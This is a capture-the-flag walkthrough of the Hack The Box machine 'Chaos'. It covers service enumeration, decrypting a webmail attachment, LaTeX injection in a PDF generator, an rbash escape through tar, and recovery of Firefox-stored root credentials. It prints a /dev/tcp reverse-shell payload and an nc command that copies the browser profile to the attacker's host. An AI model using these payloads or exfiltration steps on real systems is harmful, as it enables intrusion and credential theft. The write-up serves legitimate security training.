# Chaos

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.253.192                
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-05 13:03 +08
Nmap scan report for 10.129.253.192
Host is up (0.0076s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
110/tcp   open  pop3
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
10000/tcp open  snet-sensor-mgmt
```

Mail ports and Webmin on port 10000 is open. Might need to read messages for credentials later. Did a detailed scan too:

```
$ nmap -p 80,110,143,993,995,10000 -sC -sV --min-rate 5000 chaos.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-05 13:06 +08
Nmap scan report for chaos.htb (10.129.253.192)
Host is up (0.0061s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-title: Chaos
|_http-server-header: Apache/2.4.34 (Ubuntu)
110/tcp   open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING TOP UIDL SASL AUTH-RESP-CODE STLS RESP-CODES CAPA
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_imap-capabilities: have LOGINDISABLEDA0001 IDLE Pre-login more LITERAL+ post-login ENABLE capabilities listed ID LOGIN-REFERRALS IMAP4rev1 STARTTLS OK SASL-IR
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: have IDLE AUTH=PLAINA0001 more LITERAL+ post-login ENABLE capabilities listed ID LOGIN-REFERRALS IMAP4rev1 Pre-login OK SASL-IR
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP UIDL SASL(PLAIN) AUTH-RESP-CODE USER RESP-CODES CAPA
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.890
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I added `chaos.htb` to my `/etc/hosts` file since there's a DNS name returned from the above scan.&#x20;

### Web Enum --> Mail Creds

Visiting the IP address alone blocks us:

<figure><img src="../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

Visiting `chaos.htb` shows us a typical security company page:

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

The website looked rather static, so I did a `gobuster` directory and `wfuzz` subdomain scan. The `gobuster` scan returned nothing of interest, while the `wfuzz` scan did return a `webmail` subdomain.

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh=73 -H 'Host:FUZZ.chaos.htb' http://chaos.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://chaos.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000005:   200        120 L    386 W      5607 Ch     "webmail"
```

I also did a `gobuster` scan with the IP address of the machine as the URL, and found a Wordpress site:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.253.192 -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.253.192
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/08/05 13:12:44 Starting gobuster in directory enumeration mode
===============================================================
/wp                   (Status: 301) [Size: 313] [--> http://10.129.253.192/wp/]
```

The Wordpress site was rather simple as well, and just contained one locked article:

<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

I didn't have a password yet, so I ran a `wpscan` on the URL and found one user named `human`:

```
$ wpscan --api-token my_token --enumerate p,t,u --url http://10.129.253.192/wp/wordpress/
[i] User(s) Identified:

[+] human
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Using `human` as the password worked, and we could see the post:

<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

Now, we can add the `webmail` subdomain to the `/etc/hosts` file and enumerate that next. When visited, it just shows a typical Roundcube login page:

<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Using the credentials we found earlier, we can login to view the dashboard:

<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

### Webmail Files --> Hidden URL

Within the Drafts of the user, I found one message with 2 files called `enim_msg.txt` and `en.py`:

<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

Here's the contents of the Python script:

```python
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
```

The `enim_msg.txt` file was encrypted:

```
$ strings enim_msg.txt                                          
0000000000000234
YDo!
```

The message says that `You are the password XD`, meaning that `sahay` is the AES key used. The encryption sc ript writes the file size as the first 16 bytes, and then the next 16 bytes is the IV used. The key used is the SHA256 hash of `sahay`.&#x20;

Using this, we can construct a quyick decryptor:

```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def getKey(password):
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()

with open('enim_msg.txt', 'rb') as f:
    cipher = f.read()

iv = cipher[16:32]
key = getKey('sahay')
encryptor = AES.new(key, AES.MODE_CBC, iv)
print(encryptor.decrypt(cipher[32:]).decode('utf-8'))
```

This would output a `base64` encoded string, and when decoded it reveals a hidden URL:

```
$ python3 dec.py | base64 -d
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
```

### PDF --> RCE

The URL shows a PDF maker thing:

<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

Sending requests doesn't seem to do anything, so I took a look at it within Burpsuite:

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

The above reveals that it is running an outdated version of pdfTeX. There are multiple methods of which we can use LaTeX injection to get RCE:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#rce" %}

I used `\immediate\write18\{id}` to test, and it worked:

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

Using `\immediate\write18{bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'}` will get us a reverse shell:

<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Ayush Shell --> Shell Escape

There are 2 users present within the machine:

```
www-data@chaos:/home$ ls -la
total 16
drwxr-xr-x  4 root  root  4096 Jun 30  2022 .
drwxr-xr-x 22 root  root  4096 Jul 12  2022 ..
drwx------  5 ayush ayush 4096 Jul 12  2022 ayush
drwx------  5 sahay sahay 4096 Jul 12  2022 sahay
```

`ayush` uses the same password of `jiujitsu`.&#x20;

<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

`ayush` has a restricted shell.&#x20;

```
ayush@chaos:/home$ echo $PATH
/home/ayush/.app
ayush@chaos:/home$ ls -la
rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```

Using the TAB button, we can find the commands we can run:

```
!                         echo                      printf
./                        elif                      pushd
:                         else                      pwd
[                         enable                    read
[[                        esac                      readarray
]]                        eval                      readonly
{                         exec                      return
}                         exit                      select
alias                     export                    set
bg                        false                     shift
bind                      fc                        shopt
break                     fg                        source
builtin                   fi                        suspend
caller                    for                       tar
case                      function                  test
cd                        getopts                   then
command                   hash                      time
command_not_found_handle  help                      times
compgen                   history                   trap
complete                  if                        true
compopt                   in                        type
continue                  jobs                      typeset
coproc                    kill                      ulimit
declare                   let                       umask
dir                       local                     unalias
dirs                      logout                    unset
disown                    mapfile                   until
do                        ping                      wait
done                      popd                      while
```

I noticed that `ayush` can run `tar`, which allows us to escape the shell using:

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

### Mozilla Creds --> Root

The `ayush` user has a `.mozilla` folder present in their home directory:

```
$ ls -la
total 40
drwx------ 6 ayush ayush 4096 Aug  5 05:51 .
drwxr-xr-x 4 root  root  4096 Jun 30  2022 ..
drwxr-xr-x 2 root  root  4096 Jun 30  2022 .app
lrwxrwxrwx 1 root  root     9 Jul 12  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout
-rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrc
drwx------ 3 ayush ayush 4096 Aug  5 05:51 .gnupg
drwx------ 3 ayush ayush 4096 Aug  5 05:30 mail
drwx------ 4 ayush ayush 4096 Jun 30  2022 .mozilla
-rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile
-rw------- 1 ayush ayush   33 Aug  5 05:19 user.txt
```

This could mean that there are Firefox credentials cached within the machine. We can use this repository to decrypt the passwords within:

{% embed url="https://github.com/unode/firefox_decrypt" %}

To use it, we need to zip up the entire `.mozilla` folder and transfer it to our machine via `nc`:

```bash
tar -czvf mozilla.tar.gz .mozilla
## On kali
$ nc -l -p 4444 > mozilla.tar.gz

## on ayush
nc -w 3 10.10.14.4 4444 < mozila.tar.gz
```

Then, we can extract the files and use `jiujitsu` again to decrypt the `root` password:

```
$ tar -xf mozilla.tar.gz
$ python3 firefox_decrypt.py ~/htb/chaos/.mozilla/firefox/bzo7sjt1.default
2023-08-05 14:02:03,327 - WARNING - profile.ini not found in /home/kali/htb/chaos/.mozilla/firefox/bzo7sjt1.default
2023-08-05 14:02:03,327 - WARNING - Continuing and assuming '/home/kali/htb/chaos/.mozilla/firefox/bzo7sjt1.default' is a profile location

Primary Password for profile /home/kali/htb/chaos/.mozilla/firefox/bzo7sjt1.default: 

Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'
```

Then, `su` to `root`!

<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

Interestingly, these are credentials for the Webmin instance present on the machine.&#x20;
